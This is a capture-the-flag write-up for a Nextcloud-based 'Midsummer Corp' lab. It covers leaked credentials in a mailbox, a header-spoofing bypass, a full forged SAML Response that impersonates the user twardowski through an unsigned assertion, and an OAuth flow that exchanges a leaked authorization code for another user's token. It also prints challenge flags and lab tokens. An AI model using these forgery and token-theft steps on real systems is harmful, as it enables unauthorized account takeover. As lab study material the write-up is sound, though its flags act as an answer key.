# Task 2
We must go on website 10.10.17.40 and check carefully for the link. The link is on the bottom of the site.

<img src="./images/task_1.png" width="500"/>

# Task 3
We must open source of the main site and then we must search for default password which is Puck password.
<img src="./images/task_3.png" width="500"/>

To find information about email, we must turn on hidden files visibility. Then we can find ".mail" folder, where is "inbox.mbox" file. There is wanted mail.

# Task 4
Password to Leshy account is in "inbox.mbox" file. 

<img src="./images/task_4.png" width="500"/>

To activate 2-factor authentication we must activate in Puck settings. Unfortunately that 2-factor authentication is also valid for Leshy account. 

<img src="./images/task_4_a.png" width="500"/>

# Task 5
We must download source zip file. Let's extract it. In the "/core/routes.php" file we have all routes listed.


<img src="./images/task_5.png" width="700"/>

We also must set header which is "X-Forwarded-For". I used for that google extension Mod Header.

<img src="./images/task_5_a.png" width="500"/>

# Task 6
We must go to the settings. Next we must add Password App and view payload of request.

<img src="./images/task_6.png" width="500"/>

Next configure postman extension and application.

<img src="./images/task_6_a.png" width="500"/>
<img src="./images/task_6_b.png" width="500"/>

Send request with properly chosen loginName. Which will avoid protections.

<img src="./images/task_6_c.png" width="500"/>

<br>
<br>

# Task 7

## 1. What is the name of the XML entity that contains information about user such as their name, email, roles, etc.?

Answer: `assertion`

Answer for that information we can find in task description:

`IdP authenticates you and creates an SAML assertion`

## 2. What is the name of a party that authenticates users and issues SAML assertions?

Answer: `Identity Provider`

Also that information is in task description:

`IdP authenticates you and creates an SAML assertion`
`a user, an identity provider (IdP)`

## 3. What is the date on the document scan from Twardowski's account in DD/MM/YYYY format?

Answer: `15/06/2023`

## 4. What should be the value of Content-Type header when sending the SAML Response?

Answer: `application/x-www-form-urlencoded`

I searched for that information in google and I found that information in that [post](https://stackoverflow.com/questions/54880602/how-to-deal-with-saml-responses-without-a-content-type-header)

## 5. What should be Destination set to in SAML Response?

Answer: `files.midsummer.corp.local/apps/user_saml/saml/acs`

That information was in mail from Twardowski to Boruta:
`You can send POST request to the Service Provider (SP) to "/apps/user_saml/saml/acs"`

The first part of url we can find in the main site `10.10.116.151` in the `<a>` tag:

```html 
<a href="https://files.midsummer.corp.local" target="_blank" rel="noreferrer noopener" class="entity-name">Midsummer Corp</a>
```

## 6. What should be Issuer set to in SAML Response?
Answer: `http://idp.midsummer.corp`

In the mail from Twardowski to Boruta we can find sentence:
`For some reason http://idp.midsummer.corp stopped working lately and I could not bring it back online.`

## 7. What is the content of the Fern_flower_ritual_shard5.txt file in Twardowski's account?

Answer: `Midsummer_Corp{Look_f0r_th3_fern_w1th_silv3r_l3av3s}`


We must create saml response. I got from the Internet example of a saml response.

``` xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_8e8dc5f69a98cc4c1ff3427e5ce34606fd672f91e6" Version="2.0" IssueInstant="2014-07-17T01:01:48Z" Destination="http://10.10.116.151/apps/user_saml/saml/acs" InResponseTo="ONELOGIN_4fee3b046395c4e751011e97f8900b5273d56685">
  <saml:Issuer>http://idp.midsummer.corp</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema" ID="_d71a3a8e9fcc45c9e9d248ef7049393fc8f04e5f75" Version="2.0" IssueInstant="2014-07-17T01:01:48Z">
    <saml:Issuer>http://idp.midsummer.corp</saml:Issuer>
    <saml:Subject>
      <saml:NameID SPNameQualifier="http://10.10.116.151/apps/user_saml/saml/metadata" Format="urn:oasis:names:tc:SAML:2.0:nameid-format:transient">_ce3d2948b4cf20146dee0a0b3dd6f69b6cf86f62d7</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="2024-01-18T06:21:48Z" Recipient="http://10.10.116.151/apps/user_saml/saml/acs" InResponseTo="ONELOGIN_4fee3b046395c4e751011e97f8900b5273d56685"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="2014-07-17T01:01:18Z" NotOnOrAfter="2024-01-18T06:21:48Z">
      <saml:AudienceRestriction>
        <saml:Audience>http://10.10.116.151/apps/user_saml/saml/metadata</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="2014-07-17T01:01:48Z" SessionNotOnOrAfter="2024-07-17T09:01:48Z" SessionIndex="_be9967abd904ddcae3c0eb4189adbe3f71e327cf93">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
    <saml:AttributeStatement>
      <saml:Attribute Name="uid" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
        <saml:AttributeValue xsi:type="xs:string">test</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="mail" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
        <saml:AttributeValue xsi:type="xs:string">test@example.com</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="alias" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
        <saml:AttributeValue xsi:type="xs:string">twardowski</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="role" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
        <saml:AttributeValue xsi:type="xs:string">sso</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="eduPersonAffiliation" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
        <saml:AttributeValue xsi:type="xs:string">users</saml:AttributeValue>
        <saml:AttributeValue xsi:type="xs:string">examplerole1</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
```


I made some changes:
- issuer: `http://idp.example.com/metadata.php` -> `http://idp.midsummer.corp`
- destination: `http://sp.example.com/demo1/index.php?acs` -> `http://files.midsummer.corp.local/apps/user_saml/saml/acs` but there is some problem `files.midsummer.corp.local` does not exist, we must use machine ip instead
- recipient: same as destination

- Also Twardowski mentioned about the `sso group`, so we need to add something like this in the saml response:

```xml
<saml:AttributeStatement>
  <saml:Attribute Name="uid" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
    <saml:AttributeValue xsi:type="xs:string">test</saml:AttributeValue>
  </saml:Attribute>
  <saml:Attribute Name="mail" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
    <saml:AttributeValue xsi:type="xs:string">test@example.com</saml:AttributeValue>
  </saml:Attribute>
  <saml:Attribute Name="alias" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
    <saml:AttributeValue xsi:type="xs:string">twardowski</saml:AttributeValue>
  </saml:Attribute>
  <saml:Attribute Name="role" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
    <saml:AttributeValue xsi:type="xs:string">sso</saml:AttributeValue>
  </saml:Attribute>
  <saml:Attribute Name="eduPersonAffiliation" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
    <saml:AttributeValue xsi:type="xs:string">users</saml:AttributeValue>
    <saml:AttributeValue xsi:type="xs:string">examplerole1</saml:AttributeValue>
  </saml:Attribute>
</saml:AttributeStatement>
```

- Also we must change metadata
```xml
<saml:AudienceRestriction>
  <saml:Audience>http://10.10.200.65/apps/user_saml/saml/metadata</saml:Audience>
</saml:AudienceRestriction>
```
Without that we will get respone: `Account not provisioned`

Next we must encode saml response. I used for it [base64encode.org](https://www.base64encode.org/). Next in postman we must set cookie and body:

<img src="./images/task_7_a.png" width="500"/>
<img src="./images/task_7_b.png" width="500"/>


After we receive response, we will get cookies: `nc_username: twardowski`

<br>
<br>

# Task 8

## 1. The NextCloud application plays two OAuth roles at once. Which ones?

Answer: `Authorization Server, Resource Server`

We can get that from description:
```
 - Resource Owner, 
 - Resource Server, 
 - Client, 
 - Authorization Server. 
```

## 2. What value of the response_type parameter indicates that an application is starting the authorization code flow?

Answer: `code`

We can find it in linked blog post:

`response_type=code - This tells the authorization server that the application is initiating the authorization code flow`


## 3. During registration, each client receives a unique pair of client_id and client_secret. (Y/N)

Answer: `Y`

It is trivial. Only yes or no :). But also we can find in linked blog post:


```
The application makes a POST request to the service’s token endpoint with the following parameters:

- client_id - The application’s client ID.
- client_secret - The application’s client secret. This ensures that the request to get the access token is made only from the application, and not from a potential attacker that may have intercepted the authorization code.
```

## 4. What endpoint you should use to exchange the OAuth code for a token?

Answer: `/apps/oauth2/api/v1/token`

I made regex and I used in search bar in vs code:

<img src="./images/task_8.png" width="500"/>

<br>
<br>

## 5. What is the content of the Fern_flower_ritual_shard6.txt file in Popiel's account?

Answer: `Midsummer_Corp{Spr1nkle_wat3r_fr0m_a_s@cr3d_spr1ng_0n_th3_fern}`

At first we must get authorization code from file `authorization_code.txt`:

`Oz5xWmb0pCQEZJp6puQQoSKuM1JK9jczqe3CLKqvl0VuFM7VsWJFqMU6CF0T0ipdOtmy8lkRPIsz0PoWSTbf2gTLx86NZ7YYIY6pZ0Sj8nP6kcQY2uUFRVhxzmAhudrR`

Next we must get file `supportticket_draft.txt`. Twardowski tried to send POST to `/apps/oauth2/clients`:
```
HTTP request
POST /apps/oauth2/clients HTTP/1.1
Host: nextcloud.ctf:8081
Content-Type: application/json
Content-Length: 86
Cookie: ocqpfobax3l0=ea40d3c44aebc7c3d2d060ce0c74f7c4; oc_sessionPassphrase=mzJr4dxugNOXA34YgaivUEgs8P4p%2BEju7qBoC87qZ9S4Cu2lUGAo50U3HiuEw3CAfGgusiTSBSMA8s03rgJY0PcVgGbGJEbyNKV3EdvhxL5lXP83qw8xjBQM6qTj083j; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; nc_username=admin; nc_token=RhnpFe88vZTezlB9J0FmEj9S4lrX%2FLyl; nc_session_id=ea40d3c34aebb7c3d2d060ce0c74f7c4

{"name":"alchemy-mixer-ng","redirectUri":"https://alchemy-mixer-ng.ctf/auth/callback"}

```

I tried it in Postman, but I got response:
``` json
{
    "message": "Current user is not logged in"
}
```

So I started to search something about that endpoint.

<img src="./images/task_8_a.png" width="500"/>

We can get information in `apps/oauth2/lib/Controller/SettingsController.php` that no admin is required to send that request. So cookie `nc_username=admin` is red herring. 
<img src="./images/task_8_b.png" width="500"/>

So lets be logged in any other account. For example Puck and create app password and copy request token and cookie.

<img src="./images/task_8_c.png" width="500"/>

We got response:
``` json
{
    "id": 2,
    "name": "alchemy-mixer-ng",
    "redirectUri": "https://alchemy-mixer-ng.ctf/auth/callback",
    "clientId": "jpQ0yUpeKnyjHcujSzv6ckrioDJBZkV3VERm40vRFF0XCMlhGAQWvMZIDBuJ0mg4",
    "clientSecret": "ERoN6gXYe0qSbpNg6OUqxwMoJGFRdMhjpRjp9yMYNe9Al9JECLSxMwNYlObPee44"
}
```
Now we must send request to the `/apps/oauth2/api/v1/token` with json:

```json
{
    "grant_type": "authorization_code",
    "code": "Oz5xWmb0pCQEZJp6puQQoSKuM1JK9jczqe3CLKqvl0VuFM7VsWJFqMU6CF0T0ipdOtmy8lkRPIsz0PoWSTbf2gTLx86NZ7YYIY6pZ0Sj8nP6kcQY2uUFRVhxzmAhudrR",
    "redirect_uri": "https://alchemy-mixer-ng.ctf/auth/callback",
    "client_id": "cvpA0RrYxPz0VMeEQRXejoOJk5IQ2PPOkH803Ywap4NCC06JVfJtmBUgAS6YQmQl",
    "client_secret": "mJSTRqv62M9hX5qFmpmQN1vVmrMCZhKeiYfmRJnJjHCT0H8VeJii5FLSkRGqdjkb"
}
```

It is important to use snake_case. 

Data structure is got from blog post. 

```
- grant_type=authorization_code
- code
- redirect_uri
- client_id
- client_secret
```

code we can get from `authorization_code.txt`

After sending that, we received:

```json
{
    "access_token": "oa5yaxagaZVQDV47OAgltF58ZE1Sq6pwO5Xzrf16ma35DIfzQZA2QHbxXafzgySfAmd2C5Ca",
    "token_type": "Bearer",
    "expires_in": 3600,
    "refresh_token": "Oz5xWmb0pCQEZJp6puQQoSKuM1JK9jczqe3CLKqvl0VuFM7VsWJFqMU6CF0T0ipdOtmy8lkRPIsz0PoWSTbf2gTLx86NZ7YYIY6pZ0Sj8nP6kcQY2uUFRVhxzmAhudrR",
    "user_id": "popiel"
}
```

The most important data is "token_type" and "access_token".

Now we must apply header:

```
Authorization: Bearer oa5yaxagaZVQDV47OAgltF58ZE1Sq6pwO5Xzrf16ma35DIfzQZA2QHbxXafzgySfAmd2C5Ca
```

I used for that application `ModHeader`

<img src="./images/task_8_d.png" width="500"/>

Next we must logout of Puck' account. After that we are automatically logged in Popiel.

In `Fern_flower_ritual_shard6.txt` we got answer

<br>
<br>

# Task 9
Answer: `Midsummer_Corp{Th3-f3rN-f!0w3r-r3ve@ls_it%_5ecr3t$}`

Now we must get text from photos:
- fernflower_flag1.png
- fernflower_flag2.png
- fernflower_flag3.png
- fernflower_flag4.png
- fernflower_flag5.png
- fernflower_flag6.png

<div style="display:flex; flex-direction:column">
  <img src="./fern_flowers/fernflower_flag1.png" width="500"/>
  <img src="./fern_flowers/fernflower_flag2.png" width="500"/>
  <img src="./fern_flowers/fernflower_flag3.png" width="500"/>
  <img src="./fern_flowers/fernflower_flag4.png" width="500"/>
  <img src="./fern_flowers/fernflower_flag5.png" width="500"/>
  <img src="./fern_flowers/fernflower_flag6.png" width="500"/>
</div>